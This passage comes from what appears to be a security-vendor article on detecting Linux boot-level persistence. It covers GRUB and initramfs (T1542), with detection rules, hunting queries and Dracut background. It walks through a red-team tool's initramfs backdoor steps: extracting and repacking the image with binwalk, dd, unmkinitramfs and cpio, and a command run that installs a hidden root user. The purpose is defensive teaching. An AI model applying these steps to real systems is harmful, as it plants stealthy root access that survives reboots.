\",(0,i.jsx)(e.code,{children:\"setsid\"}),\" \\u2192 \",(0,i.jsx)(e.code,{children:\"bash\"}),\". The reason its \",(0,i.jsx)(e.code,{children:\"event.action\"}),\" value is \",(0,i.jsx)(e.code,{children:\"already-running\"}),\", is due to the payload being executed during the boot process, prior to the initialization of Elastic Defend. Depending on the boot stage of execution, Elastic Defend will be able to capture missed events with this \",(0,i.jsx)(e.code,{children:\"event.action\"}),\", allowing us to still detect the activity.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Let\\u2019s take a look at the coverage:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"Detection and endpoint rules that cover GRUB bootloader persistence\"})}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{align:\"left\",children:\"Category\"}),(0,i.jsx)(e.th,{align:\"left\",children:\"Coverage\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"File\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/linux/persistence_grub_configuration_creation.toml\",rel:\"nofollow\",children:\"GRUB Configuration File Creation\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/linux/persistence_grub_makeconfig.toml\",rel:\"nofollow\",children:\"GRUB Configuration Generation through Built-in Utilities\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"Process\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/linux/persistence_boot_file_copy.toml\",rel:\"nofollow\",children:\"Boot File Copy\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/linux/persistence_systemd_shell_execution.toml\",rel:\"nofollow\",children:\"Systemd Shell Execution During Boot\"})})]})]})]})}),`\n`,(0,i.jsx)(e.p,{children:\"You can revert the changes made by PANIX by running the following revert command:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`\u003e ./panix.sh --revert grub\n\n[*] Reverting GRUB persistence modifications...\n[*] Restoring backup of /etc/default/grub from /etc/default/grub.bak...\n[+] /etc/default/grub restored.\n[*] Removing /etc/default/grub.d/99-panix.cfg...\n[+] /etc/default/grub.d/99-panix.cfg removed.\n[*] /grub-panix.sh not found; nothing to remove.\n[*] Updating GRUB configuration...\n[...]\n[+] GRUB configuration updated.\n[+] GRUB persistence reverted successfully.\n`})}),`\n`,(0,i.jsx)(e.h1,{id:\"hunting-for-t1542---pre-os-boot-grub-bootloader\",children:\"Hunting for T1542 - Pre-OS Boot: GRUB Bootloader\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Other than relying on detections, it is important to incorporate threat hunting into your workflow, especially for persistence mechanisms like these, where events can potentially be missed due to timing or environmental constraints. This publication lists the available hunts for GRUB bootloader persistence; however, more details regarding the basics of threat hunting are outlined in the  \\u201C\",(0,i.jsx)(e.em,{children:\"Hunting for T1053 - scheduled task/job\"}),\"\\u201D section of \\u201C\",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/security-labs/primer-on-persistence-mechanisms\",rel:\"nofollow\",children:(0,i.jsx)(e.em,{children:\"Linux Detection Engineering -  A primer on persistence mechanisms\"})}),\"\\u201D. Additionally, descriptions and references can be found in our \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules\",rel:\"nofollow\",children:\"Detection Rules repository\"}),\", specifically in the \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/tree/main/hunting\",rel:\"nofollow\",children:\"Linux hunting subdirectory\"}),\".\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"We can hunt for GRUB bootloader persistence through \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/elasticsearch/reference/current/esql.html\",rel:\"nofollow\",children:\"ES|QL\"}),\" and \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/kibana/current/osquery.html\",rel:\"nofollow\",children:\"OSQuery\"}),\", focusing on file creations, modifications, and executions related to GRUB configurations. The approach includes monitoring for the following:\"]}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Creations and/or modifications to GRUB configuration files\"}),\": Tracks changes to critical files such as the GRUB configuration file and modules, and the compiled GRUB binary. These files are essential for bootloader configurations and are commonly targeted for GRUB-based persistence.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Execution of GRUB-related commands\"}),\": Monitors for commands like \",(0,i.jsx)(e.code,{children:\"grub-mkconfig\"}),\", \",(0,i.jsx)(e.code,{children:\"grub2-mkconfig\"}),\", and \",(0,i.jsx)(e.code,{children:\"update-grub\"}),\", which may indicate attempts to modify GRUB settings or regenerate boot configurations.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Metadata analysis of GRUB files\"}),\": Identifies ownership, access times, and recent changes to GRUB configuration files to detect unauthorized modifications.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Kernel and Boot Integrity Monitoring\"}),\": Tracks critical kernel and boot-related data using ES|QL and OSQuery tables such as \",(0,i.jsx)(e.code,{children:\"secureboot\"}),\", \",(0,i.jsx)(e.code,{children:\"platform_info\"}),\", \",(0,i.jsx)(e.code,{children:\"kernel_info\"}),\", and \",(0,i.jsx)(e.code,{children:\"kernel_keys\"}),\", providing insights into the system\\u2019s boot integrity and kernel configurations.\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"By combining the \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_via_grub_bootloader.toml\",rel:\"nofollow\",children:\"Persistence via GRUB Bootloader\"}),\" and \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_general_kernel_manipulation.toml\",rel:\"nofollow\",children:\"General Kernel Manipulation\"}),\" hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1542/\",rel:\"nofollow\",children:\"T1542\"}),\".\"]}),`\n`,(0,i.jsx)(e.h1,{id:\"t1542--pre-os-boot-initramfs\",children:\"T1542- Pre-OS Boot: Initramfs\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://wiki.debian.org/initramfs\",rel:\"nofollow\",children:\"Initramfs (Initial RAM Filesystem)\"}),\" is a vital part of the Linux boot process, acting as a temporary root filesystem loaded into memory by the bootloader. It enables the kernel to initialize hardware, load necessary modules, and prepare the system to mount the real root filesystem.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"As we learnt in the previous section, the bootloader (e.g., GRUB) loads two key components: the kernel (\",(0,i.jsx)(e.code,{children:\"vmlinuz\"}),\") and the initramfs image (\",(0,i.jsx)(e.code,{children:\"initrd.img\"}),\"). The \",(0,i.jsx)(e.code,{children:\"initrd.img\"}),\" is a compressed filesystem, typically stored in \",(0,i.jsx)(e.code,{children:\"/boot/\"}),\", containing essential drivers, binaries (e.g. \",(0,i.jsx)(e.code,{children:\"busybox\"}),\"), libraries, and scripts for early system initialization. Packed in formats like gzip, LZ4, or xz, it extracts into a minimal Linux filesystem with directories like \",(0,i.jsx)(e.code,{children:\"/bin\"}),\", \",(0,i.jsx)(e.code,{children:\"/lib\"}),\", and \",(0,i.jsx)(e.code,{children:\"/etc\"}),\". Once the real root filesystem is mounted, control passes to the primary \",(0,i.jsx)(e.code,{children:\"init\"}),\" system (e.g., \",(0,i.jsx)(e.code,{children:\"systemd\"}),\"), and the initramfs is discarded.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Initramfs plays a central role in the Linux boot process, but it doesn't work in isolation. The \",(0,i.jsx)(e.code,{children:\"/boot/\"}),\" directory houses essential files that enable the bootloader and kernel to function seamlessly. These files include the kernel binary, the initramfs image, and configuration data necessary for system initialization. Here's a breakdown of these critical components:\"]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"vmlinuz-\u003cversion\u003e\"}),\": A compressed Linux kernel binary.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"vmlinuz\"}),\": A symbolic link to the compressed Linux kernel binary.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"initrd.img-\u003cversion\u003e\"}),\" or \",(0,i.jsx)(e.strong,{children:\"initramfs.img-\u003cversion\u003e\"}),\": The initramfs image containing the temporary filesystem.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"initrd.img\"}),\" or \",(0,i.jsx)(e.strong,{children:\"initramfs.img\"}),\": A symbolic link to the initramfs image.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"config-\u003cversion\u003e\"}),\": Configuration options for the specific kernel version.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"System.map-\u003cversion\u003e\"}),\": Kernel symbol map used for debugging.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"grub/\"}),\": Bootloader configuration files.\"]}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"Similar to GRUB, initramfs is executed early in the boot process and therefore an interesting target for attackers seeking stealthy persistence. Modifying its contents\\u2014such as adding malicious scripts or altering initialization logic\\u2014enables execution of malicious code before the system fully initializes.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"While there is currently no specific subsection for initramfs, modification of the boot process falls under \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1542/\",rel:\"nofollow\",children:\"T1542\"}),\", \",(0,i.jsx)(e.em,{children:\"Pre-OS Boot\"}),\" in the MITRE ATT\u0026CK framework.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"The next section will explore how attackers might manipulate initramfs, the methods they could use to embed persistence mechanisms, and how to detect and mitigate these threats effectively.\"}),`\n`,(0,i.jsx)(e.h1,{id:\"t1542---initramfs-manual-modifications\",children:\"T1542 - Initramfs: Manual Modifications\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Modifying initramfs to establish persistence is a technique discussed in the \\u201C\",(0,i.jsx)(e.a,{href:\"https://breachlabs.io/initramfs-persistence-technique\",rel:\"nofollow\",children:(0,i.jsx)(e.em,{children:\"Initramfs Persistence Technique\"})}),\"\\u201D blog published on \",(0,i.jsx)(e.a,{href:\"https://breachlabs.io/\",rel:\"nofollow\",children:\"Breachlabs.io\"}),\". At its core, modifying initramfs involves unpacking its compressed filesystem, making changes, and repacking the image to maintain functionality while embedding persistence mechanisms. This process is not inherently malicious; administrators might modify initramfs to add custom drivers or configurations. However, attackers can exploit this flexibility to execute malicious actions before the primary operating system is fully loaded.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"An example technique involves adding code to the \",(0,i.jsx)(e.code,{children:\"init\"}),\" script to manipulate the host filesystem\\u2014such as creating a backdoor user, altering system files/services, or injecting scripts that persist across reboots.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"While there are helper tools for working with initramfs, manual modifications are possible through low-level utilities such as \",(0,i.jsx)(e.a,{href:\"https://github.com/ReFirmLabs/binwalk\",rel:\"nofollow\",children:\"binwalk\"}),\". \",(0,i.jsx)(e.code,{children:\"Binwalk\"}),\" is particularly useful for analyzing and extracting compressed archives, making it a good choice for inspecting and deconstructing the initramfs image.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"In the following section, we\\u2019ll provide a detailed explanation of the manual initramfs modification process.\"}),`\n`,(0,i.jsx)(e.h1,{id:\"persistence-through-t1542---initramfs-manual-modifications\",children:\"Persistence through T1542 - Initramfs: Manual Modifications\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"In this section we will be \\u201Cmanually\\u201D manipulating initramfs to add a backdoor onto the system during the boot process. To do so, we will use the \",(0,i.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/7e27768807e12d11932e2fca5b6a4867308295dd/modules/setup_initramfs.sh\",rel:\"nofollow\",children:\"setup_initramfs.sh\"}),\" module from PANIX. Let\\u2019s analyze the most important aspects of the module to ensure we understand what is going on.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Upon execution of the module, the \",(0,i.jsx)(e.code,{children:\"initrd.img\"}),\" file is backed up, as implementing a technique like this may disrupt the boot process, and having a back up available is always recommended. Next, a temporary directory is created, and the initramfs image is copied there. Through \",(0,i.jsx)(e.code,{children:\"binwalk\"}),\", we can identify and map out the different embedded archives within the \",(0,i.jsx)(e.code,{children:\"initrd.img\"}),\" (such as the CPU microcode \",(0,i.jsx)(e.code,{children:\"cpio\"}),\" archive and the gzipped \",(0,i.jsx)(e.code,{children:\"cpio\"}),\" archive containing the mini Linux filesystem). The string \",(0,i.jsx)(e.code,{children:\"TRAILER!!!\"}),\" marks the end of a \",(0,i.jsx)(e.code,{children:\"cpio\"}),\" archive, letting us know exactly where one archive finishes so we can separate it from the next. In other words, \",(0,i.jsx)(e.code,{children:\"binwalk\"}),\" shows us where to split the file, and the \",(0,i.jsx)(e.code,{children:\"TRAILER!!!\"}),\" marker confirms the boundary of the microcode \",(0,i.jsx)(e.code,{children:\"cpio\"}),\" before we extract and rebuild the rest of the initramfs. For more detailed information, take a look at the original author\\u2019s \\u201C\",(0,i.jsx)(e.a,{href:\"https://breachlabs.io/initramfs-persistence-technique\",rel:\"nofollow\",children:(0,i.jsx)(e.em,{children:\"Initramfs Persistence Technique\"})}),\"\\u201D blog.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`# Use binwalk to determine the trailer address.\nADDRESS=$(binwalk initrd.img | grep TRAILER | tail -1 | awk '{print $1}')\nif [[ -z \"$ADDRESS\" ]]; then\n\techo \"Error: Could not determine trailer address using binwalk.\"\n\texit 1\nfi\necho \"[*] Trailer address: $ADDRESS\"\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"This section extracts and unpacks parts of the \",(0,i.jsx)(e.code,{children:\"initrd.img\"}),\" file for modification. The \",(0,i.jsx)(e.code,{children:\"dd\"}),\" command extracts the first \",(0,i.jsx)(e.code,{children:\"cpio\"}),\" archive (microcode) up to the byte offset marked by \",(0,i.jsx)(e.code,{children:\"TRAILER!!!\"}),\", saving it as \",(0,i.jsx)(e.code,{children:\"initrd.img-begin\"}),\" for later reassembly. Next, \",(0,i.jsx)(e.code,{children:\"unmkinitramfs\"}),\" unpacks the remaining filesystem from \",(0,i.jsx)(e.code,{children:\"initrd.img\"}),\" into a directory (\",(0,i.jsx)(e.code,{children:\"initrd_extracted\"}),\"), enabling modifications.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`dd if=initrd.img of=initrd.img-begin count=$ADDRESS bs=1 2\u003e/dev/null || { echo \"Error: dd failed (begin)\"; exit 1; }\n\nunmkinitramfs initrd.img initrd_extracted || { echo \"Error: unmkinitramfs failed\"; exit 1; }\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Once the filesystem is extracted, it can be modified to achieve persistence. This process focuses on manipulating the \",(0,i.jsx)(e.code,{children:\"init\"}),\" file, which is responsible for initializing the Linux system during boot. The code performs the following:\"]}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Mount the root filesystem as writable.\"}),`\n`,(0,i.jsxs)(e.li,{children:[\"Attempt to create a new user with sudo privileges in two steps:\",`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Check whether the supplied user exists already, if yes, abort.\"}),`\n`,(0,i.jsxs)(e.li,{children:[\"If the user does not exist, add the user to \",(0,i.jsx)(e.code,{children:\"/etc/shadow\"}),\", \",(0,i.jsx)(e.code,{children:\"/etc/passwd\"}),\" and \",(0,i.jsx)(e.code,{children:\"/etc/group\"}),\" manually.\"]}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"This payload can be altered to whatever payload is desired. As the environment in which we are working is very limited, we need to make sure to only use tools that are available.\"}),`\n`,(0,i.jsx)(e.p,{children:\"After adding the correct payload, initramfs can be repacked. The script uses:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.code,{children:\"find . | sort | cpio -R 0:0 -o -H newc | gzip \u003e ../../initrd.img-end\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"To repack the filesystem into \",(0,i.jsx)(e.code,{children:\"initrd.img-end\"}),\". It ensures all files are owned by \",(0,i.jsx)(e.code,{children:\"root:root\"}),\" (\",(0,i.jsx)(e.code,{children:\"-R 0:0\"}),\") and uses the \",(0,i.jsx)(e.code,{children:\"newc\"}),\" format compatible with initramfs.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"The previously extracted microcode archive (\",(0,i.jsx)(e.code,{children:\"initrd.img-begin\"}),\") is concatenated with the newly created archive (\",(0,i.jsx)(e.code,{children:\"initrd.img-end\"}),\") using \",(0,i.jsx)(e.code,{children:\"cat\"}),\" to produce a final \",(0,i.jsx)(e.code,{children:\"initrd.img-new\"}),\":\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.code,{children:\"cat initrd.img-begin initrd.img-end \u003e initrd.img-new\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"The new \",(0,i.jsx)(e.code,{children:\"initrd.img-new\"}),\" replaces the original initramfs file, ensuring the system uses the modified version on the next boot.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Now that we understand the process, we can run the module and let the events unfold. Note: not all Linux distributions specify the end of a \",(0,i.jsx)(e.code,{children:\"cpio\"}),\" archive with the \",(0,i.jsx)(e.code,{children:\"TRAILER!!!\"}),\" string, and therefore this automated technique will not work for all systems. Let\\u2019s continue!\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`\u003e sudo ./panix.sh --initramfs --binwalk --username panix --password panix --snapshot yes\n[*] Will inject user 'panix' with hashed password '\u003chash\u003e' into the initramfs.\n[*] Preparing Binwalk-based initramfs persistence...\n[*] Temporary directory: /tmp/initramfs.neg1v5\n[+] Backup created: /boot/initrd.img-5.15.0-130-generic.bak\n[*] Trailer address: 8057008\n[+] Binwalk-based initramfs persistence applied. New initramfs installed.\n[+] setup_initramfs module completed successfully.\n[!] Ensure you have a recent snapshot of your system before proceeding.\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"Let\\u2019s take a look at the events that are generated in Kibana:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/the-grand-finale-on-linux-persistence/image6.png\",alt:\"PANIX Initramfs module execution visualized in Kibana - Binwalk method\",width:\"1533\",height:\"1421\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Looking at the execution logs, we can see that \",(0,i.jsx)(e.code,{children:\"openssl\"}),\" is used to generate a \",(0,i.jsx)(e.code,{children:\"passwd\"}),\" hash. Afterwards, the initramfs image is copied to a temporary directory, and \",(0,i.jsx)(e.code,{children:\"binwalk\"}),\" is leveraged to find the address of the filesystem. Once the correct section is found, \",(0,i.jsx)(e.code,{children:\"unmkinitramfs\"}),\" is called to extract the filesystem, after which the payload is added to the \",(0,i.jsx)(e.code,{children:\"init\"}),\" file. Next, the filesystem is repacked through \",(0,i.jsx)(e.code,{children:\"gzip\"}),\" and \",(0,i.jsx)(e.code,{children:\"cpio\"}),\", and combined into a fully working initramfs image with the microcode, filesystem and other sections. This image is then copied to the \",(0,i.jsx)(e.code,{children:\"/boot/\"}),\" directory, overwriting the currently active \",(0,i.jsx)(e.code,{children:\"initramfs\"}),\" image. Upon reboot, the new \",(0,i.jsx)(e.code,{children:\"panix\"}),\" user with root permissions is available.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Let\\u2019s take a look at the coverage:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"Detection and endpoint rules that cover manual initramfs persistence\"})}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{align:\"left\",children:\"Category\"}),(0,i.jsx)(e.th,{align:\"left\",children:\"Coverage\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"File\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"Process\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/3e655abfef5e6b9c759cc82fa225be48a90bbc24/rules_building_block/discovery_potential_memory_seeking_activity.toml\",rel:\"nofollow\",children:\"Potential Memory Seeking Activity\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/3e655abfef5e6b9c759cc82fa225be48a90bbc24/rules/linux/persistence_unpack_initramfs_via_unmkinitramfs.toml\",rel:\"nofollow\",children:\"Initramfs Unpacking via unmkinitramfs\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/3e655abfef5e6b9c759cc82fa225be48a90bbc24/rules/linux/persistence_extract_initramfs_via_cpio.toml\",rel:\"nofollow\",children:\"Initramfs Extraction via CPIO\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/2bb46899aea8571172687927b8084695bec44a62/rules/linux/persistence_boot_file_copy.toml\",rel:\"nofollow\",children:\"Boot File Copy\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/3e655abfef5e6b9c759cc82fa225be48a90bbc24/rules/linux/persistence_openssl_passwd_hash_generation.toml\",rel:\"nofollow\",children:\"OpenSSL Password Hash Generation\"})})]})]})]})}),`\n`,(0,i.jsx)(e.p,{children:\"You can revert the changes made by PANIX by running the following revert command:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`\u003e ./panix.sh --revert initramfs\n\n[!] Restoring initramfs from backup: $initrd_backup...\n[+] Initramfs restored successfully.\n[!] Rebuilding initramfs to remove modifications...\n[+] Initramfs rebuilt successfully.\n[!] Cleaning up temporary files...\n[+] Temporary files cleaned up.\n[+] Initramfs persistence reverted successfully.\n`})}),`\n`,(0,i.jsx)(e.h1,{id:\"hunting-for-t1542---initramfs-manual-modifications\",children:\"Hunting for T1542 - Initramfs: Manual Modifications\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to the use of tools like \",(0,i.jsx)(e.code,{children:\"binwalk\"}),\". This technique typically involves extracting, analyzing, and modifying initramfs files to inject malicious components or scripts into the boot process. The approach includes monitoring for the following:\"]}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Execution of Binwalk with Suspicious Arguments\"}),\": Tracks processes where \",(0,i.jsx)(e.code,{children:\"binwalk\"}),\" is executed to extract or analyze files. This can reveal attempts to inspect or tamper with initramfs contents.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Creations and/or Modifications to Initramfs Files\"}),\": Tracks changes to the initramfs file (\",(0,i.jsx)(e.code,{children:\"/boot/initrd.img\"}),\").\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"General Kernel Manipulation Indicators\"}),\": Leverages queries such as monitoring \",(0,i.jsx)(e.code,{children:\"secureboot\"}),\", \",(0,i.jsx)(e.code,{children:\"kernel_info\"}),\", and file changes within \",(0,i.jsx)(e.code,{children:\"/boot/\"}),\" to detect broader signs of kernel and bootloader manipulation, which may overlap with initramfs abuse.\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"By combining the \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_via_initramfs.toml\",rel:\"nofollow\",children:\"Persistence via Initramfs\"}),\" and \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_general_kernel_manipulation.toml\",rel:\"nofollow\",children:\"General Kernel Manipulation\"}),\" hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1542/\",rel:\"nofollow\",children:\"T1542\"}),\".\"]}),`\n`,(0,i.jsx)(e.h1,{id:\"t1542---initramfs-modifying-with-dracut\",children:\"T1542 - Initramfs: Modifying with Dracut\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://wiki.archlinux.org/title/Dracut\",rel:\"nofollow\",children:\"Dracut\"}),\" is a versatile tool for managing initramfs in most Linux systems. Unlike manual methods that require deconstructing and reconstructing initramfs, Dracut provides a structured, modular approach. It simplifies creating, modifying, and regenerating initramfs images while offering a robust framework to add custom functionality. It generates initramfs images by assembling a minimal Linux environment tailored to the system's needs. Its modular design ensures that only the necessary drivers, libraries, and scripts are included.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Dracut operates through modules, which are self-contained directories containing scripts, configuration files, and dependencies. These modules define the behavior and content of the initramfs. For example, they might include drivers for specific hardware, tools for handling encrypted filesystems, or custom logic for pre-boot operations.\"}),`\n`,(0,i.jsx)(e.p,{children:\"Dracut modules are typically stored in:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/usr/lib/dracut/modules.d/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/lib/dracut/modules.d/\"})}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Each module resides in a directory named in the format \",(0,i.jsx)(e.code,{children:\"XXname\"}),\", where \",(0,i.jsx)(e.code,{children:\"XX\"}),\" is a two-digit number defining the load order, and \",(0,i.jsx)(e.code,{children:\"name\"}),\" is the module name (e.g., \",(0,i.jsx)(e.code,{children:\"01base\"}),\", \",(0,i.jsx)(e.code,{children:\"95udev\"}),\").\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"The primary script that defines how the module integrates into the initramfs is called \",(0,i.jsx)(e.code,{children:\"module-setup.sh\"}),\". It specifies which files to include and what dependencies are required. Here is a basic example of a \",(0,i.jsx)(e.code,{children:\"module-setups.sh\"}),\" script:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`#!/bin/bash\n\ncheck() {\n  return 0 \n}\n\ndepends() {\n  echo \"base\"\n}\n\ninstall() {\n  inst_hook cmdline 30 \"$moddir/my_custom_script.sh\"\n  inst_simple /path/to/needed/binary\n}\n`})}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"check()\"}),\": Determines whether the module should be included. Returning 0 ensures the module is always included.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"depends()\"}),\": Specifies other modules this one depends on (e.g., \",(0,i.jsx)(e.code,{children:\"base\"}),\", 